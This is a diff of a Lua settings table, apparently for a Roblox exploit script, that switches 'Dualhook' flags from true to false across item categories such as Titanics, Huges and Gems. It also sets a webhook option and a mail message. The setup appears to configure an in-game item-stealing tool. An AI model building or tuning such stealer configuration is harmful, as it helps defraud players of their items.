@@ -3,39 +3,39 @@ getgenv().Settings = {
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
     MailMessage = "Monzz",
       Titanics = {
-        Dualhook = true,
+        Dualhook = false,
         Intensity = 100--%
       },
       Banana = {
-        Dualhook = true,
+        Dualhook = false,
         Intensity = 100--%
       },
       Huges = {
-        Dualhook = true,
+        Dualhook = false,
         Intensity = 100--%
       },
       Pogs = {
-        Dualhook = true,
+        Dualhook = false,
         Intensity = 100--%
       },
        Exclusives = {
-        Dualhook = true,
+        Dualhook = false,
         Intensity = 100--%
       },
        Events = {
-        Dualhook = true,
+        Dualhook = false,
         Intensity = 100--%
       },
        Secrets = {
-        Dualhook = true,
+        Dualhook = false,
         Intensity = 100--%
        },
        HC_DM_Mythics = {
-        Dualhook = true,
+        Dualhook = false,
         Intensity = 100--%
        },
        Gems = {
-        Dualhook = true,
+        Dualhook = false,
         Intensity = 100--%
       }
     }
